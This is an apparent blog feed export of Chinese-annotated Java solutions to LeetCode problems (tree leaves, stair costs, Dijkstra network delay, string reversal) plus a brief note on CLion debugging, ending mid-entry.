<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Given binary tree:</span><br><span class="line"></span><br><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line"> / \     </span><br><span class="line">4   5    </span><br><span class="line">Returns [[4, 5, 3], [2], [1]].</span><br><span class="line">Explanation:</span><br><span class="line"></span><br><span class="line">1. Remove the leaves [4, 5, 3] from the tree</span><br><span class="line">          1</span><br><span class="line">         / </span><br><span class="line">        2          </span><br><span class="line">2. Remove the leaf [2] from the tree</span><br><span class="line">          1          </span><br><span class="line">3. Remove the leaf [1] from the tree</span><br><span class="line">          []         </span><br><span class="line">Returns [4, 5, 3], [2], [1].</span><br></pre></td></tr></table></figure>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>寻找二叉树的叶子节点。可以从例子中观察得到，节点在结果中的位置下标，等于以该节点为根节点的二叉树的深度。所以一个最直接的思路是该节点为根节点的二叉树的深度，在相应位置添加节点的值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; findLeaves(TreeNode root) &#123;</span><br><span class="line">    <span class="keyword">int</span> height = maxHeight(root);</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (height == <span class="number">0</span>) <span class="keyword">return</span> list;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; height; i++)</span><br><span class="line">        list.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;());</span><br><span class="line">    list.get(height - <span class="number">1</span>).add(root.val);</span><br><span class="line">    traversal(list, root.left);</span><br><span class="line">    traversal(list, root.right);</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">maxHeight</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> + Math.max(maxHeight(root.left), maxHeight(root.right));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">traversal</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; list, TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    list.get(maxHeight(root) - <span class="number">1</span>).add(root.val);</span><br><span class="line">    traversal(list, root.left);</span><br><span class="line">    traversal(list, root.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Clion]]></title>
      <url>/wiki/2017/10/30/TOOLS-Clion/</url>
      <content type="html"><![CDATA[<p>Clion 可以申请学生版。个人感觉是mac上体验最棒的C++ IDE，比vscode强多了。</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>step into：单步执行，遇到子函数就进入并且继续单步执行（简而言之，进入子函数）；</p>
<p>step over：在单步执行时，在函数内遇到子函数时不会进入子函数内单步执行，而是将子函数整个执行完再停止，也就是把子函数整个作为一步。有一点,经过我们简单的调试,在不存在子函数的情况下是和step into效果一样的（简而言之，越过子函数，但子函数会执行）。</p>
<p>step out：当单步执行到子函数内时，用step out就可以执行完子函数余下部分，并返回到上一层函数。</p>
]]></content>
      
        <categories>
            
            <category> TOOLS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Cpp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[746. Min Cost Climbing Stairs]]></title>
      <url>/wiki/2017/10/30/Leetcode-746-Min-Cost-Climbing-Stairs/</url>
      <content type="html"><![CDATA[<p>On a staircase, the <code>i</code>-th step has some non-negative cost <code>cost[i]</code> assigned (0 indexed).</p>
<p>Once you pay the cost, you can either climb one or two steps. You need to find minimum cost to reach the top of the floor, and you can either start from the step with index 0, or the step with index 1.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: cost = [10, 15, 20]</span><br><span class="line">Output: 15</span><br><span class="line">Explanation: Cheapest is start on cost[1], pay that cost and go to the top.</span><br></pre></td></tr></table></figure>
<p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: cost = [1, 100, 1, 1, 1, 100, 1, 1, 100, 1]</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: Cheapest is start on cost[0], and only step on 1s, skipping cost[3].</span><br></pre></td></tr></table></figure></p>
<p>Note:</p>
<ul>
<li><code>cost</code> will have a length in the range <code>[2, 1000]</code>.</li>
<li>Every <code>cost[i]</code> will be an integer in the range <code>[0, 999]</code>.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目是LeetCode 70. Climbing Stairs的扩展，在Q70中需要求的是爬楼梯有多少种方法，这里求的是爬楼梯最小的费用。思路也是基本一致的：使用动态规划，爬到当前楼梯的最小费用minCost[i]等于爬到前一个楼梯的最小费用minCost[i - 1]，和前两个楼梯的最小费用inCost[i - 2]的较小值，加上走到当前楼梯的费用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minCostClimbingStairs</span><span class="params">(<span class="keyword">int</span>[] cost)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> [] minCost = <span class="keyword">new</span> <span class="keyword">int</span>[cost.length + <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; minCost.length; i++)</span><br><span class="line">        minCost[i] = cost[i - <span class="number">2</span>] +  Math.min(minCost[i - <span class="number">1</span>], minCost[i - <span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> Math.min(minCost[i - <span class="number">1</span>], minCost[i - <span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的，也可以省去中间结果：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minCostClimbingStairs</span><span class="params">(<span class="keyword">int</span>[] cost)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lastCost = <span class="number">0</span>, secondLastCost = <span class="number">0</span>, curCost = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; cost.length + <span class="number">2</span>; i++) &#123;</span><br><span class="line">        curCost = cost[i - <span class="number">2</span>] + Math.min(lastCost, secondLastCost);</span><br><span class="line">        secondLastCost = lastCost;</span><br><span class="line">        lastCost = curCost;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Math.min(lastCost, secondLastCost);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[743. Network Delay Time]]></title>
      <url>/wiki/2017/10/30/Leetcode-743-Network-Delay-Time/</url>
      <content type="html"><![CDATA[<p>There are $N$ network nodes, labelled 1 to $N$.</p>
<p>Given <code>times</code>, a list of travel times as <strong>directed</strong> edges <code>times[i] = (u, v, w)</code>, where $u$ is the source node, $v$ is the target node, and $w$ is the time it takes for a signal to travel from source to target.</p>
<p>Now, we send a signal from a certain node $K$. How long will it take for all nodes to receive the signal? If it is impossible, return -1.</p>
<p>Note:</p>
<ul>
<li>$N$ will be in the range [1, 100].</li>
<li>$K$ will be in the range [1, $N$].</li>
<li>The length of times will be in the range [1, 6000].</li>
<li>All edges times[i] = ($u, v, w$) will have $1 &lt;= u, v &lt;= N and 1 &lt;= w &lt;= 100$.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目思路是非常直接的。题目都说了有向图directed graph，并且需要求最长的最短路径。那么就是题目就转化为<a href="http://larryim.cc/note-os/algorithm/algorithmPrinceton/mst_shortestpath/#2-shortest-path">shortest path of directed graph</a>. 由于所有路径都为正数，可以使用经典的Dijkstra’s algorithm.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">networkDelayTime</span><span class="params">(<span class="keyword">int</span>[][] times, <span class="keyword">int</span> N, <span class="keyword">int</span> K)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] distTo = <span class="keyword">new</span> <span class="keyword">int</span>[N + <span class="number">1</span>];</span><br><span class="line">    PriorityQueue&lt;<span class="keyword">int</span>[]&gt; pq = <span class="keyword">new</span> PriorityQueue&lt;&gt;((o1, o2)-&gt;o1[<span class="number">1</span>]-o2[<span class="number">1</span>]);</span><br><span class="line">    Arrays.fill(distTo, Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//construct graph</span></span><br><span class="line">    Map&lt;Integer, Integer&gt;[] graph = </span><br><span class="line">        (HashMap&lt;Integer, Integer&gt;[]) <span class="keyword">new</span> HashMap&lt;?, ?&gt;[N + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; N + <span class="number">1</span>; i++) </span><br><span class="line">        graph[i] = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span>[] time : times) </span><br><span class="line">        graph[time[<span class="number">0</span>]].put(time[<span class="number">1</span>], time[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// dijkstra algorithm</span></span><br><span class="line">    distTo[K] = <span class="number">0</span>;</span><br><span class="line">    pq.offer(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;K, distTo[K]&#125;);</span><br><span class="line">    <span class="keyword">while</span> (!pq.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">int</span> v = pq.poll()[<span class="number">0</span>];</span><br><span class="line">        Map&lt;Integer, Integer&gt; distFromV = graph[v];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> w : distFromV.keySet())</span><br><span class="line">            <span class="keyword">if</span> (distTo[w] &gt; distTo[v] + distFromV.get(w)) &#123;</span><br><span class="line">                pq.remove(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;w, distTo[w]&#125;);</span><br><span class="line">                distTo[w] = distTo[v] + distFromV.get(w);</span><br><span class="line">                pq.offer(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;w, distTo[w]&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find min</span></span><br><span class="line">    <span class="keyword">int</span> maxLength = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= N; i++)</span><br><span class="line">        <span class="keyword">if</span> (distTo[i] == Integer.MAX_VALUE)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i != K &amp;&amp; distTo[i] &gt; maxLength)</span><br><span class="line">            maxLength = distTo[i];</span><br><span class="line">    <span class="keyword">return</span> maxLength;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Depth-first Search </tag>
            
            <tag> Breath-first Search </tag>
            
            <tag> Graph </tag>
            
            <tag> Heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[345. Reverse Vowels of a String]]></title>
      <url>/wiki/2017/10/30/Leetcode-345-Reverse-Vowels-of-a-String/</url>
      <content type="html"><![CDATA[<p>Write a function that takes a string as input and reverse only the vowels of a string.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;hello&quot;</span><br><span class="line">Output: &quot;holle&quot;</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;leetcode&quot;</span><br><span class="line">Output: &quot;leotcede&quot;</span><br></pre></td></tr></table></figure>
<p>Note:<br>The vowels does not include the letter “y”.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>首先，需要了解英文字母里面的元音字母一共有A, E, I, O, and U。这道题目思路还是非常直接的。就是从左右开始分别寻找元音字母，如果找到它们则相互交换。</p>
<p>第一个问题是如何确认该字母是元音字母。首先想到的是可以把所有字母放在HashSet中，然后查询HashSet。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Set&lt;Character&gt; vowels = <span class="keyword">new</span> HashSet&lt;&gt;(</span><br><span class="line">        Arrays.asList(<span class="string">'A'</span>, <span class="string">'E'</span>, <span class="string">'I'</span>, <span class="string">'O'</span>, <span class="string">'U'</span>,</span><br><span class="line">                <span class="string">'a'</span>, <span class="string">'e'</span>, <span class="string">'i'</span>, <span class="string">'o'</span>, <span class="string">'u'</span>));</span><br><span class="line">vowels.contains(<span class="keyword">char</span>);</span><br></pre></td></tr></table></figure>
<p>另一种方案是用Switch匹配</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isVowel</span><span class="params">(<span class="keyword">char</span> a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(a)&#123;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'a'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'e'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'i'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'o'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'u'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'A'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'E'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'I'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'O'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'U'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">default</span> : <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果显示用Switch匹配更快一些，前面方案用时7ms，后面方案用时5ms。</p>
<p>然后就是寻找元音字母了。这个其实是非常简单的，主要是细节问题，注意下标的处理。寻找元音字母的过程其实和快排的Partition过程非常类似，可以说几乎一摸一样。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> n = s.length() - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> left = <span class="number">0</span>, right = n;</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    <span class="comment">// find vowels</span></span><br><span class="line">    <span class="keyword">while</span> (!isVowel(charArray[left++]))</span><br><span class="line">        <span class="keyword">if</span> (left == n) <span class="keyword">return</span> <span class="keyword">new</span> String(charArray);</span><br><span class="line">    <span class="keyword">while</span> (!isVowel(charArray[right--])) &#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if two pointers cross</span></span><br><span class="line">    <span class="keyword">if</span> (--left &gt;= ++right)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// exchange them</span></span><br><span class="line">    temp = charArray[right];</span><br><span class="line">    charArray[right] = charArray[left];</span><br><span class="line">    charArray[left] = temp;</span><br><span class="line">    left++;</span><br><span class="line">    right--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后的问题就是字符串的表示以及返回。这里我也想到了几种方案，并进行了比较。第一种方案是使用StringBuilder，首先新建一个与原始字符串相同的StringBuilder，然后每次要交换时都进行替换。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder res = <span class="keyword">new</span> StringBuilder(s);</span><br><span class="line"><span class="comment">// exchange them</span></span><br><span class="line">res.replace(left, left + <span class="number">1</span>, String.valueOf(charArray[right]));</span><br><span class="line">res.replace(right, right + <span class="number">1</span>, String.valueOf(charArray[left]));</span><br></pre></td></tr></table></figure>
<p>这种方案的效率非常低！运行时间需要170ms，整整慢了几十倍。</p>
<p>另一种方案是直接使用char Array，由于是in-place replacement，而且没有额外对象的开销，速度非常快。</p>
<p>最后我使用的方案，击败了100%的人。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">reverseVowels</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length() &lt; <span class="number">2</span>) <span class="keyword">return</span> s;</span><br><span class="line">    <span class="keyword">char</span>[] charArray = s.toCharArray();</span><br><span class="line">    <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">int</span> n = s.length() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = n;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="comment">// find vowels</span></span><br><span class="line">        <span class="keyword">while</span> (!isVowel(charArray[left++]))</span><br><span class="line">            <span class="keyword">if</span> (left == n) <span class="keyword">return</span> <span class="keyword">new</span> String(charArray);</span><br><span class="line">        <span class="keyword">while</span> (!isVowel(charArray[right--])) &#123; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// check if two pointers cross</span></span><br><span class="line">        <span class="keyword">if</span> (--left &gt;= ++right)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// exchange them</span></span><br><span class="line">        temp = charArray[right];</span><br><span class="line">        charArray[right] = charArray[left];</span><br><span class="line">        charArray[left] = temp;</span><br><span class="line">        left++;</span><br><span class="line">        right--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> String(charArray);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isVowel</span><span class="params">(<span class="keyword">char</span> a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(a)&#123;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'a'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'e'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'i'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'o'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'u'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'A'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'E'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'I'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'O'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">case</span> (<span class="string">'U'</span>) : <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">default</span> : <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[344. Reverse String]]></title>
      <url>/wiki/2017/10/30/Leetcode-344-Reverse-String/</url>
      <content type="html"><![CDATA[<p>Write a function that takes a string as input and returns the string reversed.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;hello&quot;</span><br><span class="line">Output: &quot;olleh&quot;</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;A man, a plan, a canal: Panama&quot;</span><br><span class="line">Output: &quot;amanaP :lanac a ,nalp a ,nam A&quot;</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>循环</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">reverseString</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = s.length() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        res.append(s.charAt(i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接利用StringBuilder.reverse()方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">reverseString</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> StringBuilder(s).reverse().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[741. Cherry Pickup]]></title>
      <url>/wiki/2017/10/30/Leetcode-741-Cherry-Pickup/</url>
      <content type="html"><![CDATA[<p>In a $N \times N$ <code>grid</code> representing a field of cherries, each cell is one of three possible integers.</p>
<ul>
<li>0 means the cell is empty, so you can pass through;</li>
<li>1 means the cell contains a cherry, that you can pick up and pass through;</li>
<li>-1 means the cell contains a thorn that blocks your way.</li>
</ul>
<p>Your task is to collect maximum number of cherries possible by following the rules below:</p>
<ul>
<li>Starting at the position (0, 0) and reaching (N-1, N-1) by moving right or down through valid path cells (cells with value 0 or 1);</li>
<li>After reaching (N-1, N-1), returning to (0, 0) by moving left or up through valid path cells;</li>
<li>When passing through a path cell containing a cherry, you pick it up and the cell becomes an empty cell (0);</li>
<li>If there is no valid path between (0, 0) and (N-1, N-1), then no cherries can be collected.</li>
</ul>
<p><strong>Example 1</strong>:</p>
